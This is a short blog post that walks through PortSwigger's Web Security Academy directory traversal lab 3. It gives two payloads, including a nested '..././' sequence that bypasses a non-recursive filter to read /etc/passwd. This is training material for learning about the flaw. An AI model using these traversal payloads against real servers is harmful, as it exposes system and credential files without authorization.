---
layout: post
title:  "PortSwigger - Directory Traversal - Lab 3"
date:   2024-06-10 00:00
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [directory-traversal]
categories: [PortSwigger]
---

# Lab 3 - Directory Traversal - File path traversal, traversal sequences stripped non-recursively
><b>Lab Objective:</b>
<br/><br/>
This lab contains a path traversal vulnerability in the display of product images.
The application strips path traversal sequences from the user-supplied filename before using it.<br/><br/>
To solve the lab, retrieve the contents of the `/etc/passwd` file.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively">Port Swigger - Lab 3</a>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/44691839">Rana Khalil - Lab 3</a>
<br/>

### Solution
<hr/>

#### 1. Try the payload 

```
../../../../etc
```

![Directory Traversal - Lab 3 - Basic payload](/images/portswigger/DirectoryTraversal/lab3/directory-traversal-lab3-test-payload.png)


#### 2. We'll test to see if the filter removes the file path recursively.

```
..././..././..././..././etc/passwd
```

![Directory Traversal - Lab 3 - Recursive payload](/images/portswigger/DirectoryTraversal/lab3/directory-traversal-lab3-recursive-payload.png)
<hr/>